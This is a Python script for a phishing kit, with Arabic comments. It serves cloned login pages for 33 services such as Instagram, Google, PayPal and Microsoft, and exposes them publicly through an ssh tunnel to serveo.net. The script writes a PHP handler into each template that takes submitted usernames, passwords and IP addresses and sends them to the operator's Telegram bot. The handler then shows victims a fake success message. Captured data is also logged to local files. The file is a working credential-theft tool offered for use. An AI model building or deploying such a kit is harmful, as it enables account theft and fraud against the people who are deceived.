import os
import sys
import subprocess
import time
import webbrowser
import argparse
import json
from urllib.parse import urlparse

class colors:
    BLACK  = '\33[30m'
    RED    = '\33[31m'
    GREEN  = '\33[32m'
    YELLOW = '\33[33m'
    BLUE   = '\33[34m'
    VIOLET = '\33[35m'
    BEIGE  = '\33[36m'
    WHITE  = '\33[37m'
    BLACKBG  = '\33[40m'
    REDBG    = '\33[41m'
    GREENBG  = '\33[42m'
    YELLOWBG = '\33[43m'
    BLUEBG   = '\33[44m'
    VIOLETBG = '\33[45m'
    BEIGEBG  = '\33[46m'
    WHITEBG  = '\33[47m'
    END      = '\33[0m'

def setup_telegram():
    """Setup Telegram bot integration"""
    from telegram_config import set_chat_id, get_bot_token
    
    print_colored("\n=== إعداد بوت Telegram ===", colors.PRIMARY, bold=True)
    print_colored(f"توكن البوت: {get_bot_token()}", colors.INFO)
    
    chat_id = input(colors.YELLOW + "أدخل Chat ID الخاص بك: " + colors.RESET)
    if chat_id.strip():
        set_chat_id(chat_id.strip())
        print_colored("تم حفظ إعدادات Telegram بنجاح!", colors.SUCCESS)
        
        # إنشاء ملف PHP مخصص لكل قالب
        print_colored("\nجاري إعداد ملفات PHP للقوالب...", colors.INFO)
        setup_php_files(chat_id.strip())
    else:
        print_colored("لم يتم إدخال Chat ID!", colors.ERROR)

def setup_php_files(chat_id):
    """Setup PHP files for all templates"""
    import os
    from telegram_config import get_bot_token
    
    sites_dir = "sites"
    if not os.path.exists(sites_dir):
        print_colored("مجلد sites غير موجود!", colors.ERROR)
        return
    
    php_code_template = f'''<?php
// إعدادات Telegram
$botToken = '{get_bot_token()}';
$chatId = '{chat_id}';

// تضمين معالج Telegram
require_once('../../telegram_handler.php');

if ($_SERVER["REQUEST_METHOD"] == "POST") {{
    // الحصول على عنوان IP
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'غير معروف';
    
    // استخراج البيانات (قد تختلف أسماء الحقول حسب القالب)
    $username = $_POST['username'] ?? $_POST['email'] ?? $_POST['login_email'] ?? 'غير متاح';
    $password = $_POST['password'] ?? $_POST['login_password'] ?? 'غير متاح';
    
    // اسم القالب الحالي
    $template = basename(dirname(__FILE__));
    
    // إرسال البيانات إلى Telegram
    logCredentials($template, $username, $password, $ip, $botToken, $chatId);
    
    // إعادة توجيه أو رسالة نجاح (اختياري)
    echo "<script>alert('تم تسجيل الدخول بنجاح!'); window.location.href='login.html';</script>";
}}
?>'''
    
    template_count = 0
    for template_dir in os.listdir(sites_dir):
        template_path = os.path.join(sites_dir, template_dir)
        if os.path.isdir(template_path):
            php_file = os.path.join(template_path, "telegram_login.php")
            try:
                with open(php_file, 'w', encoding='utf-8') as f:
                    f.write(php_code_template)
                template_count += 1
            except Exception as e:
                print_colored(f"خطأ في إنشاء ملف {php_file}: {e}", colors.ERROR)
    
    print_colored(f"تم إعداد {template_count} قالب بنجاح!", colors.SUCCESS)
    print_colored("يمكنك الآن استخدام telegram_login.php في أي قالب لإرسال البيانات إلى Telegram", colors.INFO)

try:
    from theme import print_banner
    print_banner()

    from theme import colors, print_colored

    print_colored("\n                       Available Templates\n", colors.PRIMARY, bold=True)

    template_list = [
        "[1] Instagram          [2] Facebook            [3] Snapchat",
        "[4] Twitter            [5] GitHub              [6] Google", 
        "[7] Spotify            [8] Netflix             [9] PayPal",
        "[10] Origin            [11] Steam              [12] Yahoo!",
        "[13] LinkedIn          [14] Protonmail         [15] Wordpress",
        "[16] Microsoft         [17] IGFollowers        [18] eBay",
        "[19] Pinterest         [20] CryptoCurrency     [21] Verizon",
        "[22] DropBox           [23] Adobe ID           [24] Shopify",
        "[25] FB Messenger      [26] GitLab             [27] Twitch",
        "[28] MySpace           [29] Badoo              [30] VK",
        "[31] Yandex            [32] devianART          [33] Custom"
    ]

    for line in template_list:
        print_colored(line, colors.SECONDARY)

    print_colored("\nSpecial Commands:", colors.INFO)
    print_colored("[T] Toggle Dark/Light Mode", colors.ACCENT)
    print_colored("[TG] Setup Telegram Bot", colors.ACCENT)
    print_colored("[Q] Quit Application", colors.ERROR)
    print_colored("\nPlease Choose A Number To Host Template:", colors.PRIMARY)
    templates = {
    '1': 'instagram',
    '2': 'facebook',
    '3': 'snapchat',
    '4': 'twitter',
    '5': 'github',
    '6': 'google',
    '7': 'spotify',
    '8': 'netflix',
    '9': 'paypal',
    '10': 'origin',
    '11': 'steam',
    '12': 'yahoo',
    '13': 'linkedin',
    '14': 'protonmail',
    '15': 'wordpress',
    '16': 'microsoft',
    '17': 'igfollowers',
    '18': 'ebay',
    '19': 'pinterest',
    '20': 'cryptocurrency',
    '21': 'verizon',
    '22': 'dropbox',
    '23': 'adobeid',
    '24': 'shopify',
    '25': 'fbmessenger',
    '26': 'gitlab',
    '27': 'twitch',
    '28': 'myspace',
    '29': 'badoo',
    '30': 'vk',
    '31': 'yandex',
    '32': 'devianart',
    '33': 'create'
    }
    number = input(colors.YELLOW + "[" + colors.RESET + "?" + colors.YELLOW + "]" + colors.RESET + "> ")
    
    if number.upper() == "TG":
        setup_telegram()
        exit()
    elif number.upper() == "T":
        config.toggle_dark_mode()
        colors.update_colors()
        print_banner()
        exit()
    elif number.upper() == "Q":
        exit()
    elif number == "18":
        print("Ebay Currently Does Not Work. Choose Another..")
        exit()
    else:
        pass
    choice = templates[number]
    print("Loading %s" % (choice))
    print("\nEnter A Custom Subdomain")
    subdom = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
    print(colors.GREEN + "Starting Server at %s.serveo.net..." % (subdom))
    print("Logs Can Be Found In sites/%s/ip.txt and sites/%s/usernames.txt" % (choice, choice) + colors.END)
    cmd_line = "sudo php -t sites/%s -S 127.0.0.1:80 & ssh -R %s.serveo.net:80:127.0.0.1:80 serveo.net" % (choice, subdom)
    p = subprocess.Popen(cmd_line, shell=True)
    out = p.communicate()[0]


except KeyboardInterrupt:
    pass